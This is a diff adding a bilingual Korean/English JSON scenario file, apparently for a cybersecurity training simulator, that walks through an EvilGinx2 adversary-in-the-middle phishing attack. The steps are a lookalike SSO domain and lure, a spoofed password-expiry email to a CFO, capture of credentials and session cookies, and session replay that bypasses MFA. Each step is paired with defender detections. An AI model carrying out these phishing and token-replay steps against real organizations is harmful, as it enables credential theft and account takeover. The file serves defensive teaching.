@@ -1,0 +1,179 @@
+{
+  "id": "T1598.003",
+  "title": "링크 기반 스피어피싱 시뮬레이션",
+  "titleEn": "Spearphishing Link Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "🔧 피싱 인프라 구축", "labelEn": "🔧 Phishing Infrastructure", "steps": [0, 1] },
+    { "label": "🎣 크레덴셜 수확", "labelEn": "🎣 Credential Harvesting", "steps": [2, 3] },
+    { "label": "✅ MFA 우회", "labelEn": "✅ MFA Bypass", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "phish", "label": "Phishing Server", "x": 200, "y": 30 },
+    { "id": "proxy", "label": "Reverse Proxy", "x": 200, "y": 90 },
+    { "id": "email", "label": "Target Email", "x": 350, "y": 60 },
+    { "id": "creds", "label": "Credentials", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "phish", "minStep": 0 },
+    { "from": "phish", "to": "proxy", "minStep": 1 },
+    { "from": "ext", "to": "email", "minStep": 2 },
+    { "from": "email", "to": "proxy", "minStep": 3 },
+    { "from": "proxy", "to": "creds", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "phishing_kit/", "icon": "📁" },
+    { "name": "harvested_creds.db", "icon": "📄", "alert": true },
+    { "name": "session_tokens.json", "icon": "📝" }
+  ],
+  "steps": [
+    {
+      "cmd": "evilginx2 -p /opt/evilginx2/phishlets",
+      "out": "              _ _       _            ___  \n   _____   _(_) | __ _(_)_ __ __  _|__ \\ \n  / _ \\ \\ / / | |/ _` | | '_ \\\\ \\/ / / / \n |  __/\\ V /| | | (_| | | | | |>  < |_| \n  \\___| \\_/ |_|_|\\__, |_|_| |_/_/\\_\\(_) \n                  |___/                  \n\n[inf] evilginx2 v3.2.0\n[inf] Loading phishlets from: /opt/evilginx2/phishlets\n[inf] Loaded: microsoft365, google, okta, github\n[inf] Listening on 0.0.0.0:443",
+      "def": "[Threat Intel] Known phishing framework EvilGinx2 deployment detected on VPS",
+      "defAction": "Source: Threat Intelligence Feed\nTarget: 198.51.100.60\nAction: IP added to blocklist",
+      "desc": "EvilGinx2 피싱 프레임워크를 설치하여 리버스 프록시 기반 크레덴셜 하베스팅을 준비합니다.",
+      "descEn": "Installing EvilGinx2 phishing framework for reverse proxy-based credential harvesting.",
+      "stepTitle": "EvilGinx2 피싱 프레임워크 설치",
+      "stepTitleEn": "EvilGinx2 Phishing Framework Setup",
+      "feynman": "EvilGinx2는 '투명 유리' 같은 도구입니다. 피해자와 실제 로그인 사이트 사이에 투명한 유리를 놓으면, 피해자는 정상적으로 로그인하지만 유리 뒤에서 비밀번호와 세션 쿠키를 모두 복사합니다.",
+      "feynmanEn": "EvilGinx2 is like a transparent glass placed between the victim and the real login page. The victim logs in normally, but behind the glass, passwords and session cookies are copied.",
+      "expert": "EvilGinx2는 리버스 프록시 기반 MITM 피싱 프레임워크입니다. 실제 서비스의 TLS 세션을 중계하여 비밀번호뿐만 아니라 세션 쿠키까지 탈취하여 MFA를 우회합니다.",
+      "expertEn": "EvilGinx2 is a reverse proxy-based MITM phishing framework. It relays actual TLS sessions, capturing not just passwords but session cookies to bypass MFA.",
+      "defTooltip": "🔍 위협 인텔: EvilGinx2 피싱 프레임워크 배포 감지",
+      "defTooltipEn": "🔍 Threat Intel: EvilGinx2 phishing framework deployment detected",
+      "hackerLog": {
+        "title": "evilginx_setup.log",
+        "lines": [
+          { "log": "Loaded: microsoft365, google, okta", "desc": "💡 주요 인증 서비스 피슬릿 로드 완료" },
+          { "log": "Listening on 0.0.0.0:443", "desc": "💡 HTTPS 포트에서 피싱 서버 가동" },
+          { "log": "v3.2.0", "desc": "💡 최신 버전으로 보안 솔루션 탐지 우회 기능 포함" }
+        ]
+      },
+      "terms": [
+        { "name": "EvilGinx2", "desc": "리버스 프록시 기반 피싱 프레임워크. 실제 웹사이트를 중계하여 비밀번호와 세션 쿠키를 동시에 탈취합니다" },
+        { "name": "Phishlet", "desc": "EvilGinx2에서 특정 서비스(Microsoft 365 등)를 피싱하기 위한 설정 파일" }
+      ]
+    },
+    {
+      "cmd": "evilginx2> phishlets hostname microsoft365 login.{companyName}-sso.com\nevilginx2> phishlets enable microsoft365\nevilginx2> lures create microsoft365",
+      "out": "[inf] Setting hostname for phishlet 'microsoft365': login.{companyName}-sso.com\n[inf] SSL certificate obtained via Let's Encrypt\n[inf] Phishlet 'microsoft365' enabled\n\n[inf] Lure created:\n  ID: 0\n  Phishlet: microsoft365\n  URL: https://login.{companyName}-sso.com/WjKx9m\n  Redirect: https://outlook.office365.com\n  \n[inf] Victim will see: Microsoft 365 login page\n[inf] After login: redirected to real Outlook",
+      "def": "[Certificate Monitor] New SSL cert for suspicious domain login.{companyName}-sso.com",
+      "defAction": "Source: Certificate Transparency Logs\nTarget: login.{companyName}-sso.com\nAction: Typosquatting domain flagged, SOC alerted",
+      "desc": "대상 조직과 유사한 도메인으로 피싱 사이트를 설정하고 함정 URL을 생성합니다.",
+      "descEn": "Configuring phishing site with a lookalike domain and generating lure URLs.",
+      "stepTitle": "피싱 도메인 설정 및 루어 생성",
+      "stepTitleEn": "Phishing Domain Setup and Lure Generation",
+      "feynman": "회사의 SSO 로그인 페이지와 거의 동일한 가짜 사이트를 만듭니다. 도메인도 'company-sso.com'처럼 진짜와 비슷하게 만들고, Let's Encrypt로 진짜 SSL 인증서까지 발급받아 브라우저에 자물쇠 아이콘이 표시됩니다.",
+      "feynmanEn": "A fake site nearly identical to the company's SSO login page is created. The domain 'company-sso.com' looks similar to the real one, and a real SSL certificate from Let's Encrypt shows the browser lock icon.",
+      "expert": "타이포스쿼팅 도메인(company-sso.com)에 Let's Encrypt DV 인증서를 발급받아 신뢰성을 확보합니다. 루어 URL(/WjKx9m)은 원타임 또는 대상별 추적이 가능하며, 로그인 후 실제 Outlook으로 리다이렉트하여 의심을 줄입니다.",
+      "expertEn": "A Let's Encrypt DV certificate on a typosquatting domain establishes credibility. Lure URLs are trackable per-target, and post-login redirect to real Outlook reduces suspicion.",
+      "defTooltip": "🔐 인증서 모니터: 의심스러운 도메인 login.{companyName}-sso.com의 새 SSL 인증서",
+      "defTooltipEn": "🔐 Certificate Monitor: New SSL cert for suspicious domain",
+      "hackerLog": {
+        "title": "phishing_config.log",
+        "lines": [
+          { "log": "hostname: login.{companyName}-sso.com", "desc": "💡 타이포스쿼팅 도메인으로 진짜처럼 위장" },
+          { "log": "SSL certificate obtained via Let's Encrypt", "desc": "💡 유효한 SSL 인증서 = 자물쇠 아이콘 표시" },
+          { "log": "Redirect: https://outlook.office365.com", "desc": "💡 로그인 후 진짜 사이트로 이동 - 피해자는 모름" }
+        ]
+      },
+      "terms": [
+        { "name": "Typosquatting", "desc": "정상 도메인과 유사한 도메인을 등록하는 기법. 예: microsoft.com → microsoftt.com, mic-rosoft.com" },
+        { "name": "Let's Encrypt", "desc": "무료 SSL/TLS 인증서를 자동 발급하는 인증 기관. 피싱 사이트에도 HTTPS 적용이 가능합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 send_phish.py --template 'password_expiry' --to cfo@{companyName}.com --lure-url 'https://login.{companyName}-sso.com/WjKx9m'",
+      "out": "[+] Loading email template: password_expiry\n[+] Spoofing sender: noreply@{companyName}.com\n[+] Target: cfo@{companyName}.com (Kim Jihyun, CFO)\n\n--- Email Preview ---\nFrom: Microsoft 365 <noreply@{companyName}.com>\nSubject: [긴급] Microsoft 365 비밀번호 만료 알림\n\n안녕하세요 김지현님,\n\n귀하의 Microsoft 365 비밀번호가 24시간 후 만료됩니다.\n비밀번호를 갱신하지 않으면 이메일 접근이 차단됩니다.\n\n[지금 비밀번호 갱신하기] ← (phishing link)\n\n---\n[+] Email sent successfully via SMTP relay\n[+] Tracking pixel embedded",
+      "def": "[Email Gateway] Spoofed sender detected - DMARC fail for noreply@{companyName}.com",
+      "defAction": "Source: Email gateway\nTarget: cfo@{companyName}.com\nAction: Email quarantined (DMARC policy: reject)",
+      "desc": "CFO에게 비밀번호 만료 긴급 이메일을 발송하여 피싱 링크 클릭을 유도합니다.",
+      "descEn": "Sending a password expiry urgent email to CFO to lure them into clicking the phishing link.",
+      "stepTitle": "스피어 피싱 이메일 발송",
+      "stepTitleEn": "Spearphishing Email Delivery",
+      "feynman": "CFO에게 '비밀번호가 곧 만료됩니다'라는 긴급 이메일을 보냅니다. 사람은 '긴급'이라는 단어를 보면 신중하게 생각하기보다 빨리 행동하려 합니다. 이메일의 '비밀번호 갱신' 버튼을 클릭하면 가짜 로그인 페이지로 이동합니다.",
+      "feynmanEn": "An 'urgent password expiry' email is sent to the CFO. When people see 'urgent,' they tend to act quickly rather than think carefully. Clicking the 'renew password' button leads to the fake login page.",
+      "expert": "SMTP 릴레이를 통한 발신자 스푸핑(noreply@{companyName}.com). DMARC가 'reject' 정책이면 차단되지만, 'none' 또는 미설정 시 수신됩니다. 트래킹 픽셀로 이메일 열람 여부를 실시간 모니터링합니다.",
+      "expertEn": "Sender spoofing via SMTP relay. DMARC 'reject' blocks this, but 'none' or unconfigured lets it through. Tracking pixel monitors email opens in real-time.",
+      "defTooltip": "📧 이메일 게이트웨이: 발신자 스푸핑 감지 - DMARC 실패",
+      "defTooltipEn": "📧 Email Gateway: Spoofed sender detected - DMARC fail",
+      "hackerLog": {
+        "title": "phish_email.log",
+        "lines": [
+          { "log": "Target: cfo@{companyName}.com (CFO)", "desc": "💡 CFO를 직접 타겟팅 - BEC와 결합 가능" },
+          { "log": "Subject: [긴급] 비밀번호 만료 알림", "desc": "💡 긴급성을 강조하여 즉각적인 행동 유도" },
+          { "log": "Tracking pixel embedded", "desc": "💡 이메일 열람 여부를 실시간 추적 중" }
+        ]
+      },
+      "terms": [
+        { "name": "DMARC", "desc": "이메일 발신자 인증 프로토콜. SPF와 DKIM 결과를 기반으로 스푸핑된 이메일을 차단하거나 격리합니다" },
+        { "name": "Tracking Pixel", "desc": "1x1 픽셀 크기의 투명 이미지를 이메일에 삽입하여 수신자가 이메일을 열었는지 추적하는 기법" }
+      ]
+    },
+    {
+      "cmd": "evilginx2> sessions",
+      "out": "[inf] Active sessions:\n\n  ID | Phishlet      | Username              | Password    | Tokens\n  ---+---------------+-----------------------+-------------+--------\n  1  | microsoft365  | kim.jihyun@{companyName}.com | S3cur3P@ss! | ✓\n\n[inf] Session 1 details:\n  IP: 10.0.10.30\n  User-Agent: Chrome/121.0 Windows 10\n  Login time: 2024-03-15 14:32:17 KST\n  Session cookie: eyJhbGciOiJSUzI1NiIs...\n  MFA: Completed (Authenticator app)\n  Redirect: Successful (victim on real Outlook now)",
+      "def": "[Identity Platform] Suspicious login from new device/IP for kim.jihyun",
+      "defAction": "Source: Azure AD Identity Protection\nTarget: kim.jihyun@{companyName}.com\nAction: Risk event generated, conditional access policy evaluation",
+      "desc": "CFO가 피싱 페이지에 로그인하여 비밀번호와 세션 토큰이 탈취됩니다.",
+      "descEn": "CFO logs into the phishing page, and password plus session tokens are captured.",
+      "stepTitle": "크레덴셜 및 세션 토큰 탈취",
+      "stepTitleEn": "Credential and Session Token Capture",
+      "feynman": "CFO가 가짜 로그인 페이지에 비밀번호를 입력하고 MFA 인증까지 완료했습니다. EvilGinx2가 '투명 유리' 역할을 하여 비밀번호뿐만 아니라 MFA 이후 발급되는 세션 쿠키까지 모두 복사했습니다. CFO는 정상적으로 Outlook을 사용하고 있어 아무것도 눈치채지 못합니다.",
+      "feynmanEn": "The CFO entered their password and completed MFA on the fake page. EvilGinx2's 'transparent glass' copied not just the password but also the session cookie issued after MFA. The CFO is using Outlook normally, noticing nothing.",
+      "expert": "리버스 프록시가 피해자의 전체 인증 플로우를 중계하여 세션 쿠키(JWT)를 탈취합니다. MFA가 완료된 후의 세션 토큰이므로 MFA를 완전히 우회합니다. 피해자는 실제 Outlook으로 리다이렉트되어 침해를 인지하지 못합니다.",
+      "expertEn": "The reverse proxy relays the victim's entire authentication flow, capturing the session cookie (JWT). Since the token is issued after MFA completion, MFA is completely bypassed.",
+      "defTooltip": "🔐 ID 플랫폼: kim.jihyun 계정에 새 기기/IP에서 의심스러운 로그인",
+      "defTooltipEn": "🔐 Identity: Suspicious login from new device/IP for kim.jihyun",
+      "hackerLog": {
+        "title": "captured_session.log",
+        "lines": [
+          { "log": "Username: kim.jihyun@{companyName}.com", "desc": "💡 CFO 계정 크레덴셜 탈취 성공!" },
+          { "log": "MFA: Completed (Authenticator app)", "desc": "💡 MFA 인증까지 우회 완료 - 세션 쿠키 확보" },
+          { "log": "Session cookie: eyJhbGciOiJSUzI1NiIs...", "desc": "💡 JWT 세션 토큰으로 CFO처럼 로그인 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "Session Cookie", "desc": "로그인 상태를 유지하는 브라우저 쿠키. 이 쿠키를 탈취하면 비밀번호 없이도 해당 사용자로 로그인할 수 있습니다" },
+        { "name": "JWT (JSON Web Token)", "desc": "인증 정보를 담고 있는 토큰. Base64로 인코딩되어 있으며, 서명으로 무결성이 보장됩니다" }
+      ]
+    },
+    {
+      "cmd": "python3 token_replay.py --cookie 'eyJhbGciOiJSUzI1NiIs...' --target outlook.office365.com",
+      "out": "[+] Injecting stolen session cookie...\n[+] Accessing: https://outlook.office365.com\n[+] Authentication: SUCCESS (as kim.jihyun@{companyName}.com)\n\n[+] Mailbox access confirmed:\n  - Inbox: 1,247 emails\n  - Sent: 892 emails\n  - Contacts: 456\n  - Calendar: 89 events\n\n[+] Sensitive emails found:\n  1. 'Q4 Financial Report - Confidential' (2 days ago)\n  2. 'Board Meeting Minutes' (5 days ago)\n  3. 'Wire Transfer Authorization' (1 week ago)\n\n[+] Full account takeover successful - NO MFA prompt",
+      "def": "[SIEM] Session replay attack detected - impossible travel for kim.jihyun",
+      "defAction": "Source: Azure AD + SIEM correlation\nTarget: kim.jihyun@{companyName}.com\nAction: Account suspended, IR team engaged, all sessions revoked",
+      "desc": "탈취한 세션 쿠키로 CFO의 이메일에 접근하여 기밀 정보를 열람합니다.",
+      "descEn": "Using the stolen session cookie to access the CFO's email and read confidential information.",
+      "stepTitle": "세션 토큰 재생으로 계정 탈취",
+      "stepTitleEn": "Account Takeover via Session Replay",
+      "feynman": "탈취한 세션 쿠키를 공격자의 브라우저에 주입하면, 마치 CFO가 직접 로그인한 것처럼 이메일에 접근할 수 있습니다. MFA를 다시 요청하지 않습니다. 왜냐하면 이미 인증이 완료된 세션이기 때문입니다.",
+      "feynmanEn": "Injecting the stolen session cookie into the attacker's browser grants access as if the CFO logged in directly. No MFA prompt because the session is already authenticated.",
+      "expert": "세션 쿠키 리플레이 공격으로 MFA를 완전히 우회합니다. FIDO2/WebAuthn만이 이 공격을 방어할 수 있습니다(도메인 바인딩). Impossible travel 탐지(서울 → 외국 IP 동시 접속)로 SIEM에서 감지 가능합니다.",
+      "expertEn": "Session cookie replay completely bypasses MFA. Only FIDO2/WebAuthn defends against this (domain binding). Impossible travel detection (Seoul → foreign IP simultaneously) enables SIEM detection.",
+      "defTooltip": "🚨 SIEM: 세션 리플레이 공격 감지 - kim.jihyun 불가능 이동",
+      "defTooltipEn": "🚨 SIEM: Session replay attack - impossible travel for kim.jihyun",
+      "hackerLog": {
+        "title": "account_takeover.log",
+        "lines": [
+          { "log": "Full account takeover - NO MFA prompt", "desc": "💡 MFA 없이 CFO 이메일 완전 장악!" },
+          { "log": "Q4 Financial Report - Confidential", "desc": "💡 기밀 재무 보고서 접근 가능" },
+          { "log": "Wire Transfer Authorization", "desc": "💡 송금 승인 이메일 - BEC 공격에 활용 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "Session Replay Attack", "desc": "탈취한 세션 토큰을 재사용하여 피해자의 계정에 접근하는 공격. MFA를 완전히 우회합니다" },
+        { "name": "FIDO2/WebAuthn", "desc": "피싱에 강한 무비밀번호 인증 방식. 도메인에 바인딩되어 피싱 사이트에서는 작동하지 않습니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "bash", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "evilginx2 (PID: 6001)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "python3 send_phish.py (PID: 6134)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "python3 token_replay.py (PID: 6201)", "depth": 1, "alert": true, "minStep": 4 }
+  ]
+}
